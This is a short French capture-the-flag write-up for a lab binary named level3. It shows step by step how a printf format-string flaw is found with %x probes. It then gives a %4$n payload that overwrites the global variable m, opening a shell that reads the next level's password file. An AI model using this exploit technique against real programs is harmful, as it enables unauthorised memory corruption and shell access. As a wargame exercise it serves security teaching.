### Level 3

#### Etape 01 :

En regardant la décompilation, on voit que la variable globale `m` conditionne l'accès au shell.
L'objectif est donc de modifier la valeur de `m`.

On repère aussi un `printf(buffer)` sans format explicite : c'est une faille de type format string.

#### Etape 02 :

On utilise `%x` pour lire la stack et trouver la position de notre entrée :

```bash
python -c 'print "eeee %x %x %x %x"' | ./level3
```

Sortie observée :

```text
eeee 200 b7fd1ac0 b7ff37d0 65656565
```

`65656565` correspond à `eeee`, donc notre entrée est à la 4e position sur la stack.

#### Etape 03 :

On place l'adresse de `m` (`0x0804988c` trouve avec `p &m` sur gdb) au début de l'entrée.
Ensuite, on utilise `%n` pour écrire le nombre de caractères déjà imprimés à l'adresse pointée par le 4e argument (`%4$n`) -> utilise le 4eme argument comme adresse .

Payload :

```bash
python -c 'print "\x8c\x98\x04\x08" + "A" * 60 + "%4$n"' > /tmp/payload
```

#### Etape 04 :

On exécute le binaire avec le payload :

```bash
cat /tmp/payload - | ./level3
```

Si l'écriture a bien fonctionné, le shell est exécuté.
On peut alors récupérer le mot de passe du niveau suivant :

```bash
cat /home/user/level4/.pass
```



